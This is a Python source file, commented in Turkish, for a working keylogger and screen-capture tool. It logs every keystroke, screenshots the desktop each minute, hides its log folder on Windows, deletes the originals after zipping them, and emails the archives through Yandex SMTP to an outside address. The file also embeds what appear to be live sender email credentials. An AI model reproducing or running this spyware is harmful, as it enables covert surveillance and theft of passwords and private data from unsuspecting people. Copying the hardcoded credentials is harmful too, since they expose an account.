from pynput.keyboard import Listener
import pyautogui
import datetime
import threading
import os
import zipfile
import smtplib
import time
import ctypes
from email.message import EmailMessage

# Sabitler
LOG_DIR = "logs"
SCREENSHOT_DIR = os.path.join(LOG_DIR, "screenshots")
KEYLOG_DIR = os.path.join(LOG_DIR, "keylogs")
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)
if not os.path.exists(KEYLOG_DIR):
    os.makedirs(KEYLOG_DIR)

# Global olarak yönetilecek tuş vuruşlarını depolayan liste
keylog_buffer = []

def on_press(key):
    global keylog_buffer
    # Tuş vuruşlarını daha okunabilir bir formatta yazdır
    try:
        # Normal tuşlar için
        keylog = str(key).replace("'", "")
    except AttributeError:
        # Özel tuşlar (boşluk, ctrl, vs.) için
        keylog = f"[{key}]"

    keylog_buffer.append(keylog + ' ')  # Bir boşluk ekleyerek listeye ekle


def save_keylog(timestamp):
    global keylog_buffer
    if keylog_buffer:
        txt_filename = f"keylog_{timestamp}.txt"
        txt_file_path = os.path.join(KEYLOG_DIR, txt_filename)

        with open(txt_file_path, "w") as file:
            # Her bir tuş vuruşunu tek bir satırda ve tırnak içinde kaydedin
            file.write("'{}'\n".format("','".join(keylog_buffer)))

        keylog_buffer = []  # Listeyi sıfırla


def take_screenshot(timestamp):
    filename = f"screenshot_{timestamp}.png"
    file_path = os.path.join(SCREENSHOT_DIR, filename)
    screenshot = pyautogui.screenshot()
    screenshot.save(file_path)
    print(f"Screenshot saved as {file_path}")

def zip_logs(timestamp):
    zip_filename = os.path.join(LOG_DIR, f"logs_{timestamp}.zip")
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Ekran görüntülerini ve tuş vuruşlarını ziple
        for folder in [SCREENSHOT_DIR, KEYLOG_DIR]:
            for root, _, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, LOG_DIR))
                    # Ziplendikten sonra dosyayı sil
                    os.remove(file_path)
    print(f"Logs zipped as {zip_filename}")
    return zip_filename

def send_email(zip_filename):
    # E-posta gönderme işlemleri
    email_sender = 'elixiron@yandex.com'
    email_password = 'nvezbrakvjchyevc'
    email_receiver = 'atakan21@outlook.com'

    subject = 'Keylogger Data'
    body = "Please find attached the keylogger data."

    # E-posta mesajını oluştur
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg.set_content(body)

    # Zipli dosyayı e-postaya ekleyin
    with open(zip_filename, 'rb') as f:
        file_data = f.read()
        msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=os.path.basename(zip_filename))

    # SMTP sunucusu üzerinden e-posta gönder
    with smtplib.SMTP_SSL('smtp.yandex.com', 465) as smtp:
        smtp.login(email_sender, email_password)
        smtp.send_message(msg)
    print("Email sent!")

def hide_folder(path):
    """Klasörü gizleyen fonksiyon"""
    ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)  # 0x02 -> Gizli


def timed_task():
    global keylog_buffer
    hide_folder(LOG_DIR)  # LOG_DIR klasörünü gizle
    while True:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        keylog_buffer = []  # Tuş vuruşlarını tutmak için bir tampon oluştur
        
        # Tuş vuruşlarını kaydetmeye başla
        with Listener(on_press=on_press) as listener:
            t = threading.Timer(60, listener.stop)
            t.start()
            listener.join()
        
        # Kayıt işlemleri
        save_keylog(timestamp)
        take_screenshot(timestamp)
        zip_filename = zip_logs(timestamp)
        send_email(zip_filename)

        # Bir sonraki periyot için bekle
        time.sleep(60)

if __name__ == "__main__":
    timed_task()